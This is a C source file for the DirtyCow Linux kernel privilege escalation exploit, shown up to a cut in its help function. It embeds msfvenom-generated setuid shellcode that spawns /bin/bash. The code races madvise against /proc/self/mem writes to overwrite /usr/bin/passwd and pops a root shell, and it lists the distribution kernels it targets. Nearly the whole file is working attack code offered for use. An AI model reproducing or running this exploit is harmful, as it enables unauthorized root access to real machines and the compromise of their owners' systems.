/*
* (un)comment correct payload first (x86 or x64)!
*
* $ gcc cowroot.c -o cowroot -pthread
* $ ./cowroot
* DirtyCow root privilege escalation
* Backing up /usr/bin/passwd.. to /tmp/bak
* Size of binary: 57048
* Racing, this may take a while..
* /usr/bin/passwd overwritten
* Popping root shell.
* Don't forget to restore /tmp/bak
* thread stopped
* thread stopped
* root@box:/root/cow# id
* uid=0(root) gid=1000(foo) groups=1000(foo)
*
* @robinverton
*/

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <pthread.h>
#include <string.h>
#include <unistd.h>
#include "main.h"

void *map;
int stop = 0;
char *name;
char suid_binary[] = "/usr/bin/passwd";

/*
* msfvenom -p linux/x86/exec CMD="echo '0' > /proc/sys/vm/dirty_writeback_centisecs;/bin/bash" PrependSetuid=True -f elf | xxd -i
*/

unsigned char sc[] = {
  0x7f, 0x45, 0x4c, 0x46, 0x01, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x03, 0x00, 0x01, 0x00, 0x00, 0x00,
  0x23, 0x81, 0x04, 0x08, 0x34, 0x00, 0x00, 0x00, 0xb0, 0x07, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x34, 0x00, 0x20, 0x00, 0x05, 0x00, 0x28, 0x00,
  0x0a, 0x00, 0x09, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x80, 0x04, 0x08, 0x00, 0x80, 0x04, 0x08, 0x44, 0x07, 0x00, 0x00,
  0x44, 0x07, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00,
  0x01, 0x00, 0x00, 0x00, 0x44, 0x07, 0x00, 0x00, 0x44, 0x97, 0x04, 0x08,
  0x44, 0x97, 0x04, 0x08, 0x18, 0x00, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00,
  0x06, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00,
  0xd4, 0x00, 0x00, 0x00, 0xd4, 0x80, 0x04, 0x08, 0xd4, 0x80, 0x04, 0x08,
  0x24, 0x00, 0x00, 0x00, 0x24, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00,
  0x04, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x44, 0x07, 0x00, 0x00,
  0x44, 0x97, 0x04, 0x08, 0x44, 0x97, 0x04, 0x08, 0x00, 0x00, 0x00, 0x00,
  0x04, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00,
  0x51, 0xe5, 0x74, 0x64, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x06, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00,
  0x14, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x47, 0x4e, 0x55, 0x00,
  0x0e, 0xc7, 0x37, 0xf6, 0xb9, 0x5e, 0xea, 0xfd, 0xcd, 0x3a, 0xe9, 0x69,
  0xb6, 0x16, 0xe3, 0x27, 0xb7, 0x05, 0x39, 0x6b, 0x8d, 0x4c, 0x24, 0x04,
  0x83, 0xe4, 0xf0, 0xff, 0x71, 0xfc, 0x55, 0x89, 0xe5, 0x51, 0x83, 0xec,
  0x0c, 0x8b, 0x41, 0x04, 0x8d, 0x50, 0x04, 0x52, 0xff, 0x70, 0x04, 0xe8,
  0x8e, 0x00, 0x00, 0x00, 0x8b, 0x4d, 0xfc, 0x83, 0xc4, 0x10, 0xc9, 0x8d,
  0x61, 0xfc, 0xc3, 0x59, 0x89, 0xe0, 0x51, 0x8d, 0x74, 0x88, 0x04, 0x56,
  0x50, 0x51, 0x89, 0x35, 0x60, 0x97, 0x04, 0x08, 0xad, 0x85, 0xc0, 0x75,
  0xfb, 0xad, 0x85, 0xc0, 0x74, 0x0b, 0x83, 0xf8, 0x20, 0xad, 0x75, 0xf5,
  0xa3, 0x50, 0x97, 0x04, 0x08, 0xe8, 0x3f, 0x01, 0x00, 0x00, 0x50, 0xe8,
  0x06, 0x00, 0x00, 0x00, 0xf4, 0x0f, 0xb7, 0xc0, 0xeb, 0x05, 0xb0, 0x01,
  0x0f, 0xb6, 0xc0, 0x57, 0x56, 0x53, 0x55, 0x89, 0xe7, 0x8b, 0x5f, 0x14,
  0x8b, 0x4f, 0x18, 0x8b, 0x57, 0x1c, 0x8b, 0x77, 0x20, 0x8b, 0x6f, 0x28,
  0x8b, 0x7f, 0x24, 0xff, 0x15, 0x50, 0x97, 0x04, 0x08, 0x5d, 0x5b, 0x5e,
  0x5f, 0x3d, 0x7c, 0xff, 0xff, 0xff, 0x72, 0x0d, 0xf7, 0xd8, 0x50, 0xe8,
  0x09, 0x00, 0x00, 0x00, 0x8f, 0x00, 0x83, 0xc8, 0xff, 0xc3, 0xcd, 0x80,
  0xc3, 0xb8, 0xfc, 0xff, 0xff, 0xff, 0x65, 0x03, 0x05, 0x00, 0x00, 0x00,
  0x00, 0xc3, 0x56, 0x53, 0x83, 0xec, 0x08, 0x8b, 0x5c, 0x24, 0x14, 0x8b,
  0x74, 0x24, 0x18, 0xff, 0x35, 0x60, 0x97, 0x04, 0x08, 0x56, 0x53, 0xe8,
  0xf6, 0x02, 0x00, 0x00, 0x83, 0xc4, 0x10, 0x40, 0x75, 0x17, 0xb8, 0xfc,
  0xff, 0xff, 0xff, 0x65, 0x83, 0x38, 0x08, 0x75, 0x0c, 0x51, 0x51, 0x56,
  0x53, 0xe8, 0xf8, 0x02, 0x00, 0x00, 0x83, 0xc4, 0x10, 0x5a, 0x83, 0xc8,
  0xff, 0x5b, 0x5e, 0xc3, 0x8b, 0x08, 0x85, 0xc9, 0x74, 0x0d, 0x39, 0xd1,
  0x75, 0x04, 0x8b, 0x40, 0x04, 0xc3, 0x83, 0xc0, 0x08, 0xeb, 0xed, 0x31,
  0xc0, 0xc3, 0x83, 0xec, 0x1c, 0x83, 0x3d, 0x7c, 0x97, 0x04, 0x08, 0x00,
  0x8b, 0x15, 0x58, 0x97, 0x04, 0x08, 0x8b, 0x44, 0x24, 0x20, 0xc7, 0x04,
  0x24, 0xff, 0xff, 0xff, 0xff, 0xc7, 0x44, 0x24, 0x08, 0xff, 0xff, 0x0f,
  0x00, 0xc7, 0x44, 0x24, 0x0c, 0x51, 0x00, 0x00, 0x00, 0x89, 0x00, 0xc7,
  0x40, 0x04, 0x00, 0x00, 0x00, 0x00, 0xc7, 0x40, 0x08, 0x00, 0x00, 0x00,
  0x00, 0xc7, 0x40, 0x0c, 0x00, 0x00, 0x00, 0x00, 0x89, 0x50, 0x14, 0x89,
  0x44, 0x24, 0x04, 0x78, 0x36, 0x83, 0xec, 0x0c, 0x8d, 0x44, 0x24, 0x0c,
  0x50, 0xe8, 0x79, 0x02, 0x00, 0x00, 0x83, 0xc4, 0x10, 0x85, 0xc0, 0x75,
  0x18, 0x8b, 0x04, 0x24, 0x8d, 0x04, 0xc5, 0x03, 0x00, 0x00, 0x00, 0x8e,
  0xe8, 0xc7, 0x05, 0x7c, 0x97, 0x04, 0x08, 0x01, 0x00, 0x00, 0x00, 0xeb,
  0x0a, 0xc7, 0x05, 0x7c, 0x97, 0x04, 0x08, 0xff, 0xff, 0xff, 0xff, 0x83,
  0xc4, 0x1c, 0xc3, 0x8b, 0x54, 0x24, 0x04, 0xa1, 0x64, 0x97, 0x04, 0x08,
  0xe9, 0x57, 0xff, 0xff, 0xff, 0x55, 0x89, 0xe5, 0x57, 0x56, 0x53, 0x83,
  0xec, 0x1c, 0x8b, 0x5d, 0x10, 0x83, 0x3b, 0x00, 0x8d, 0x5b, 0x04, 0x75,
  0xf8, 0xba, 0x19, 0x00, 0x00, 0x00, 0x89, 0xd8, 0x89, 0x1d, 0x64, 0x97,
  0x04, 0x08, 0xe8, 0x31, 0xff, 0xff, 0xff, 0x85, 0xc0, 0x89, 0xc6, 0x75,
  0x31, 0x83, 0xec, 0x20, 0x8d, 0x74, 0x24, 0x0f, 0x51, 0x51, 0x6a, 0x00,
  0x68, 0x93, 0x85, 0x04, 0x08, 0x83, 0xe6, 0xf0, 0xe8, 0xec, 0x01, 0x00,
  0x00, 0x83, 0xc4, 0x0c, 0x89, 0xc7, 0x6a, 0x0a, 0x56, 0x50, 0xe8, 0xe5,
  0x01, 0x00, 0x00, 0x89, 0x3c, 0x24, 0xe8, 0xc8, 0x01, 0x00, 0x00, 0x83,
  0xc4, 0x10, 0x8b, 0x06, 0xba, 0x21, 0x00, 0x00, 0x00, 0xa3, 0x58, 0x97,
  0x04, 0x08, 0x89, 0xd8, 0xe8, 0xe7, 0xfe, 0xff, 0xff, 0x89, 0xda, 0xa3,
  0x78, 0x97, 0x04, 0x08, 0x31, 0xc9, 0x31, 0xc0, 0x8b, 0x32, 0x85, 0xf6,
  0x74, 0x1d, 0x83, 0xfe, 0x03, 0x75, 0x07, 0x8b, 0x42, 0x04, 0x85, 0xc9,
  0xeb, 0x0a, 0x83, 0xfe, 0x05, 0x75, 0x07, 0x8b, 0x4a, 0x04, 0x85, 0xc0,
  0x75, 0x05, 0x83, 0xc2, 0x08, 0xeb, 0xdd, 0x85, 0xc9, 0x74, 0x3a, 0x85,
  0xc0, 0x74, 0x36, 0x31, 0xd2, 0x89, 0xc6, 0x83, 0xc0, 0x20, 0x83, 0x78,
  0xe0, 0x07, 0x75, 0x24, 0x8b, 0x46, 0x08, 0xa3, 0x68, 0x97, 0x04, 0x08,
  0x8b, 0x46, 0x10, 0xa3, 0x6c, 0x97, 0x04, 0x08, 0x8b, 0x46, 0x14, 0xa8,
  0x0f, 0x74, 0x06, 0x83, 0xc0, 0x0f, 0x83, 0xe0, 0xf0, 0xa3, 0x84, 0x97,
  0x04, 0x08, 0xeb, 0x05, 0x42, 0x39, 0xca, 0x75, 0xcc, 0x8b, 0x15, 0x84,
  0x97, 0x04, 0x08, 0x81, 0xfa, 0x00, 0x00, 0x00, 0x20, 0x0f, 0x87, 0xc1,
  0x00, 0x00, 0x00, 0xa1, 0x6c, 0x97, 0x04, 0x08, 0x39, 0xc2, 0x0f, 0x82,
  0xb4, 0x00, 0x00, 0x00, 0x8d, 0x4a, 0x3e, 0x8b, 0x35, 0x68, 0x97, 0x04,
  0x08, 0x83, 0xe1, 0xf0, 0x29, 0xcc, 0x8d, 0x4c, 0x24, 0x0f, 0x83, 0xec,
  0x0c, 0x83, 0xe1, 0xf0, 0x89, 0x4d, 0xe4, 0x89, 0xcf, 0x89, 0xc1, 0xf3,
  0xa4, 0x89, 0xd1, 0x03, 0x55, 0xe4, 0x29, 0xc1, 0x31, 0xc0, 0x89, 0x15,
  0x74, 0x97, 0x04, 0x08, 0xf3, 0xaa, 0x52, 0xe8, 0x3a, 0xfe, 0xff, 0xff,
  0x8b, 0x35, 0x74, 0x97, 0x04, 0x08, 0xba, 0x20, 0x00, 0x00, 0x00, 0x89,
  0xd8, 0xe8, 0x12, 0xfe, 0xff, 0xff, 0x89, 0x46, 0x10, 0xc7, 0x04, 0x24,
  0xa0, 0x85, 0x04, 0x08, 0xe8, 0x4d, 0x01, 0x00, 0x00, 0x83, 0xc4, 0x10,
  0x31, 0xd2, 0x85, 0xc0, 0x74, 0x17, 0x52, 0x52, 0x68, 0xab, 0x85, 0x04,
  0x08, 0x50, 0xe8, 0x52, 0x00, 0x00, 0x00, 0x31, 0xd2, 0x83, 0xc4, 0x10,
  0x85, 0xc0, 0x0f, 0x95, 0xc2, 0x8b, 0x45, 0x0c, 0x89, 0x15, 0x54, 0x97,
  0x04, 0x08, 0x8b, 0x00, 0xa3, 0x88, 0x97, 0x04, 0x08, 0xa3, 0x80, 0x97,
  0x04, 0x08, 0x40, 0x8a, 0x50, 0xff, 0x84, 0xd2, 0x74, 0x07, 0x80, 0xfa,
  0x2f, 0x75, 0xf3, 0xeb, 0xec, 0x50, 0xff, 0x75, 0x10, 0xff, 0x75, 0x0c,
  0xff, 0x75, 0x08, 0xe8, 0xc4, 0xfc, 0xff, 0xff, 0x89, 0x04, 0x24, 0xe8,
  0x1e, 0xfd, 0xff, 0xff, 0x8d, 0x65, 0xf4, 0xb8, 0x6f, 0x00, 0x00, 0x00,
  0x5b, 0x5e, 0x5f, 0x5d, 0xc3, 0x55, 0x57, 0x83, 0xcd, 0xff, 0x56, 0x53,
  0x31, 0xc0, 0x89, 0xe9, 0x83, 0xec, 0x0c, 0x8b, 0x74, 0x24, 0x24, 0x8b,
  0x5c, 0x24, 0x20, 0x89, 0xf7, 0xf2, 0xae, 0x89, 0xdf, 0x89, 0xca, 0x89,
  0xe9, 0xf2, 0xae, 0xf7, 0xd2, 0x89, 0xd8, 0xf7, 0xd1, 0x4a, 0x8d, 0x69,
  0xff, 0x74, 0x30, 0x31, 0xc0, 0x39, 0xea, 0x89, 0xd7, 0x77, 0x28, 0x29,
  0xd1, 0x8d, 0x2c, 0x0b, 0x39, 0xeb, 0x74, 0x19, 0x8a, 0x06, 0x38, 0x03,
  0x75, 0x10, 0x50, 0x57, 0x56, 0x53, 0xe8, 0xde, 0x00, 0x00, 0x00, 0x83,
  0xc4, 0x10, 0x85, 0xc0, 0x74, 0x07, 0x43, 0xeb, 0xe3, 0x31, 0xc0, 0xeb,
  0x02, 0x89, 0xd8, 0x83, 0xc4, 0x0c, 0x5b, 0x5e, 0x5f, 0x5d, 0xc3, 0xb0,
  0x06, 0xe9, 0xa6, 0xfc, 0xff, 0xff, 0xb0, 0x0b, 0xe9, 0x9f, 0xfc, 0xff,
  0xff, 0xb0, 0x05, 0xe9, 0x98, 0xfc, 0xff, 0xff, 0xb0, 0x03, 0xe9, 0x91,
  0xfc, 0xff, 0xff, 0xb0, 0xf3, 0xe9, 0x8a, 0xfc, 0xff, 0xff, 0x55, 0x89,
  0xe5, 0x53, 0x52, 0x8b, 0x4d, 0x0c, 0x31, 0xd2, 0x83, 0x3c, 0x91, 0x00,
  0x8d, 0x42, 0x01, 0x74, 0x04, 0x89, 0xc2, 0xeb, 0xf3, 0x8d, 0x14, 0x95,
  0x26, 0x00, 0x00, 0x00, 0x8b, 0x5d, 0x08, 0x83, 0xe2, 0xf0, 0x29, 0xd4,
  0x8d, 0x54, 0x24, 0x0f, 0x83, 0xe2, 0xf0, 0xc7, 0x02, 0xb4, 0x85, 0x04,
  0x08, 0x89, 0x5a, 0x04, 0x83, 0xf8, 0x01, 0x74, 0x0a, 0x8b, 0x5c, 0x81,
  0xfc, 0x89, 0x1c, 0x82, 0x48, 0xeb, 0xf1, 0x50, 0xff, 0x35, 0x60, 0x97,
  0x04, 0x08, 0x52, 0x68, 0xb4, 0x85, 0x04, 0x08, 0xe8, 0x8d, 0xff, 0xff,
  0xff, 0x8b, 0x5d, 0xfc, 0xc9, 0xc3, 0x56, 0x57, 0x8b, 0x7c, 0x24, 0x0c,
  0xfc, 0x89, 0xfa, 0x31, 0xc0, 0x8d, 0x48, 0xff, 0xf2, 0xae, 0xf7, 0xd1,
  0x49, 0x51, 0x0f, 0xb6, 0x0a, 0x8b, 0x35, 0x60, 0x97, 0x04, 0x08, 0xeb,
  0x05, 0x0f, 0xb6, 0x0a, 0x89, 0xc6, 0xad, 0x09, 0xc0, 0x74, 0x1a, 0x38,
  0x08, 0x75, 0xf7, 0x89, 0xd7, 0x96, 0x8b, 0x0c, 0x24, 0xf3, 0xa6, 0x75,
  0xe8, 0x09, 0xc9, 0x75, 0xe4, 0x80, 0x3e, 0x3d, 0x75, 0xdf, 0x8d, 0x46,
  0x01, 0x59, 0x5f, 0x5e, 0xc3, 0x56, 0x57, 0x31, 0xc0, 0x89, 0xe1, 0x8b,
  0x71, 0x0c, 0x8b, 0x79, 0x10, 0x8b, 0x49, 0x14, 0xe3, 0x0a, 0xfc, 0xf3,
  0xa6, 0x74, 0x05, 0x19, 0xc0, 0x83, 0xc8, 0x01, 0x5f, 0x5e, 0xc3, 0x2f,
  0x64, 0x65, 0x76, 0x2f, 0x75, 0x72, 0x61, 0x6e, 0x64, 0x6f, 0x6d, 0x00,
  0x4c, 0x44, 0x5f, 0x50, 0x52, 0x45, 0x4c, 0x4f, 0x41, 0x44, 0x00, 0x76,
  0x61, 0x6c, 0x67, 0x72, 0x69, 0x6e, 0x64, 0x00, 0x2f, 0x62, 0x69, 0x6e,
  0x2f, 0x73, 0x68, 0x00, 0x14, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x01, 0x7a, 0x52, 0x00, 0x01, 0x7c, 0x08, 0x01, 0x1b, 0x0c, 0x04, 0x04,
  0x88, 0x01, 0x00, 0x00, 0x28, 0x00, 0x00, 0x00, 0x1c, 0x00, 0x00, 0x00,
  0x1c, 0xfb, 0xff, 0xff, 0x2b, 0x00, 0x00, 0x00, 0x00, 0x44, 0x0c, 0x01,
  0x00, 0x47, 0x10, 0x05, 0x02, 0x75, 0x00, 0x43, 0x0f, 0x03, 0x75, 0x7c,
  0x06, 0x55, 0x0c, 0x01, 0x00, 0x44, 0xc5, 0x43, 0x0c, 0x04, 0x04, 0x00,
  0x10, 0x00, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x91, 0xfb, 0xff, 0xff,
  0x0d, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00,
  0x5c, 0x00, 0x00, 0x00, 0x8a, 0xfb, 0xff, 0xff, 0x3e, 0x00, 0x00, 0x00,
  0x00, 0x41, 0x0e, 0x08, 0x86, 0x02, 0x41, 0x0e, 0x0c, 0x83, 0x03, 0x43,
  0x0e, 0x14, 0x4e, 0x0e, 0x18, 0x41, 0x0e, 0x1c, 0x41, 0x0e, 0x20, 0x48,
  0x0e, 0x10, 0x4f, 0x0e, 0x14, 0x41, 0x0e, 0x18, 0x41, 0x0e, 0x1c, 0x41,
  0x0e, 0x20, 0x48, 0x0e, 0x10, 0x41, 0x0e, 0x0c, 0x44, 0xc3, 0x0e, 0x08,
  0x41, 0xc6, 0x0e, 0x04, 0x10, 0x00, 0x00, 0x00, 0xa0, 0x00, 0x00, 0x00,
  0x84, 0xfb, 0xff, 0xff, 0x16, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x20, 0x00, 0x00, 0x00, 0xb4, 0x00, 0x00, 0x00, 0x86, 0xfb, 0xff, 0xff,
  0x85, 0x00, 0x00, 0x00, 0x00, 0x43, 0x0e, 0x20, 0x02, 0x4b, 0x0e, 0x2c,
  0x45, 0x0e, 0x30, 0x48, 0x0e, 0x20, 0x69, 0x0e, 0x04, 0x00, 0x00, 0x00,
  0x10, 0x00, 0x00, 0x00, 0xd8, 0x00, 0x00, 0x00, 0xe7, 0xfb, 0xff, 0xff,
  0x0e, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x2c, 0x00, 0x00, 0x00,
  0xec, 0x00, 0x00, 0x00, 0xe1, 0xfb, 0xff, 0xff, 0xbc, 0x01, 0x00, 0x00,
  0x00, 0x41, 0x0e, 0x08, 0x85, 0x02, 0x42, 0x0d, 0x05, 0x46, 0x87, 0x03,
  0x86, 0x04, 0x83, 0x05, 0x03, 0xaf, 0x01, 0xc3, 0x41, 0xc6, 0x41, 0xc7,
  0x41, 0xc5, 0x0c, 0x04, 0x04, 0x00, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00,
  0x1c, 0x01, 0x00, 0x00, 0x6d, 0xfd, 0xff, 0xff, 0x66, 0x00, 0x00, 0x00,
  0x00, 0x41, 0x0e, 0x08, 0x85, 0x02, 0x41, 0x0e, 0x0c, 0x87, 0x03, 0x44,
  0x0e, 0x10, 0x86, 0x04, 0x41, 0x0e, 0x14, 0x83, 0x05, 0x47, 0x0e, 0x20,
  0x78, 0x0e, 0x24, 0x41, 0x0e, 0x28, 0x41, 0x0e, 0x2c, 0x41, 0x0e, 0x30,
  0x48, 0x0e, 0x20, 0x50, 0x0e, 0x14, 0x41, 0xc3, 0x0e, 0x10, 0x41, 0xc6,
  0x0e, 0x0c, 0x41, 0xc7, 0x0e, 0x08, 0x41, 0xc5, 0x0e, 0x04, 0x00, 0x00,
  0x20, 0x00, 0x00, 0x00, 0x68, 0x01, 0x00, 0x00, 0xaa, 0xfd, 0xff, 0xff,
  0x5c, 0x00, 0x00, 0x00, 0x00, 0x41, 0x0e, 0x08, 0x85, 0x02, 0x42, 0x0d,
  0x05, 0x42, 0x83, 0x03, 0x02, 0x56, 0xc5, 0xc3, 0x0c, 0x04, 0x04, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x96, 0x81, 0x04, 0x08, 0x01, 0x00, 0x00, 0x00, 0x00, 0xff, 0x0a, 0x00,
  0x00, 0x2e, 0x73, 0x68, 0x73, 0x74, 0x72, 0x74, 0x61, 0x62, 0x00, 0x2e,
  0x6e, 0x6f, 0x74, 0x65, 0x2e, 0x67, 0x6e, 0x75, 0x2e, 0x62, 0x75, 0x69,
  0x6c, 0x64, 0x2d, 0x69, 0x64, 0x00, 0x2e, 0x74, 0x65, 0x78, 0x74, 0x00,
  0x2e, 0x72, 0x6f, 0x64, 0x61, 0x74, 0x61, 0x00, 0x2e, 0x65, 0x68, 0x5f,
  0x66, 0x72, 0x61, 0x6d, 0x65, 0x00, 0x2e, 0x74, 0x62, 0x73, 0x73, 0x00,
  0x2e, 0x67, 0x6f, 0x74, 0x2e, 0x70, 0x6c, 0x74, 0x00, 0x2e, 0x64, 0x61,
  0x74, 0x61, 0x00, 0x2e, 0x62, 0x73, 0x73, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x0b, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00,
  0x02, 0x00, 0x00, 0x00, 0xd4, 0x80, 0x04, 0x08, 0xd4, 0x00, 0x00, 0x00,
  0x24, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x1e, 0x00, 0x00, 0x00,
  0x01, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0xf8, 0x80, 0x04, 0x08,
  0xf8, 0x00, 0x00, 0x00, 0x9b, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x24, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x32, 0x00, 0x00, 0x00,
  0x93, 0x85, 0x04, 0x08, 0x93, 0x05, 0x00, 0x00, 0x29, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
  0x01, 0x00, 0x00, 0x00, 0x2c, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
  0x02, 0x00, 0x00, 0x00, 0xbc, 0x85, 0x04, 0x08, 0xbc, 0x05, 0x00, 0x00,
  0x88, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x36, 0x00, 0x00, 0x00,
  0x08, 0x00, 0x00, 0x00, 0x03, 0x04, 0x00, 0x00, 0x44, 0x97, 0x04, 0x08,
  0x44, 0x07, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x3c, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00,
  0x44, 0x97, 0x04, 0x08, 0x44, 0x07, 0x00, 0x00, 0x0c, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00,
  0x04, 0x00, 0x00, 0x00, 0x45, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
  0x03, 0x00, 0x00, 0x00, 0x50, 0x97, 0x04, 0x08, 0x50, 0x07, 0x00, 0x00,
  0x0c, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x4b, 0x00, 0x00, 0x00,
  0x08, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x60, 0x97, 0x04, 0x08,
  0x5c, 0x07, 0x00, 0x00, 0x2c, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x01, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x5c, 0x07, 0x00, 0x00, 0x50, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00
};
unsigned int sc_len = 2368;

void *madviseThread(void *arg)
{
    char *str;
    str=(char*)arg;
    int i,c=0;
    for(i=0;i<1000000 && !stop;i++) {
        c+=madvise(map,100,MADV_DONTNEED);
    }
    printf("[-] thread stopped\n");
}

void *procselfmemThread(void *arg)
{
    char *str;
    str=(char*)arg;
    int f=open("/proc/self/mem",O_RDWR);
    int i,c=0;
    for(i=0;i<1000000 && !stop;i++) {
        lseek(f,(off_t)map,SEEK_SET);
        c+=write(f, str, sc_len);
    }
    printf("[-] thread stopped\n");
}

void *waitForWrite(void *arg) {
    char *str;
    str=(char*)arg;
    char buf[sc_len];

    for(;;) {
        FILE *fp = fopen(str, "rb");

        fread(buf, sc_len, 1, fp);

        if(memcmp(buf, sc, sc_len) == 0) {
            printf("%s overwritten\n", str);
            break;
        }

        fclose(fp);
        sleep(1);
    }

    stop = 1;

	char *cmd[sizeof(self) / sizeof(char *) + 1];
	int i;
	cmd[0] = str;
	//printf("Need to copy %d items\n", (sizeof(self) / sizeof(char *)));
	for(i=0;i<sizeof(self) / sizeof(char *);i++){
		cmd[i+1] = self[i];
	}
	char env[strlen(str) + 9];
	sprintf(env, "DIRTYCOW=%s", str);
	putenv(env);
	int ret = execv(str, cmd);
}

int dirtycow_init(int euid) {
	// If we're not root, there's no cleanup to be done
	if (euid != 0 )
		return 0;

	// If DIRTYCOW is set, then there's clean up to do
	char *dirty = getenv("DIRTYCOW");
	if (dirty == NULL)
		return 0;

	struct stat st;

	stat("/tmp/bak", &st);
	char orig[st.st_size];
	FILE *fb = fopen("/tmp/bak","rb");
    fread(orig, st.st_size, 1, fb);
	fclose(fb);

	FILE *fo = fopen(dirty,"wb");
    fwrite(orig, st.st_size, 1, fo);
	fclose(fo);
}

int dirtycow_run() {
	struct stat st;
    char *backup;
	// change if no permissions to read

    printf("[+] DirtyCow root privilege escalation\n");
    printf("[+] Backing up %s to /tmp/bak\n", suid_binary);

    asprintf(&backup, "cp %s /tmp/bak", suid_binary);
    system(backup);

    int f = open(suid_binary,O_RDONLY);
    stat(suid_binary,&st);

    char payload[st.st_size];
    memset(payload, 0x90, st.st_size);
    memcpy(payload, sc, sc_len+1);

    map = mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);

    printf("[+] Racing, this may take a while..\n");

	pthread_t pth1,pth2,pth3;
    pthread_create(&pth1, NULL, &madviseThread, suid_binary);
    pthread_create(&pth2, NULL, &procselfmemThread, payload);
    pthread_create(&pth3, NULL, &waitForWrite, suid_binary);

    pthread_join(pth3, NULL);

    return 0;
}

void dirtycow_help(){
	fprintf (stderr, "\nDirtycow info:\n");
	fprintf (stderr, "Overrides /usr/bin/passwd in the process. Back is kept at /tmp/bak.\n");
	fprintf (stderr, "Works up to:\n");
	fprintf (stderr, "    Ubuntu 16.10     4.8.0-26.28\n");
	fprintf (stderr, "    Ubuntu 16.04 LTS 4.4.0-45.66\n");
	fprintf (stderr, "    Ubuntu 14.04 LTS 3.13.0-100.147\n");
	fprintf (stderr, "    UBuntu 12.04 LTS 3.2.0-113.155\n");
	fprintf (stderr, "    Debian 8         3.16.36-1+deb8u2\n");
	fprintf (stderr, "    Debian 7         3.2.82-1\n");
	fprintf (stderr, "    Debian unstable  4.7.8-1\n");
	fprintf (stderr, "    ArchLinux        4.4.26-1\n");
	fprintf (stderr, "    ArchLinux        4.8.3\n");
	fprintf (stderr, "    RHEL/CentOS 6.7  kernel-2.6.32-573.x\n");
	fprintf (stderr, "    RHEL/CentOS 6.6  kernel-2.6.32-504.x\n");
	fprintf (stderr, "    RHEL/CentOS 6.5  kernel-2.6.32-431.x\n");
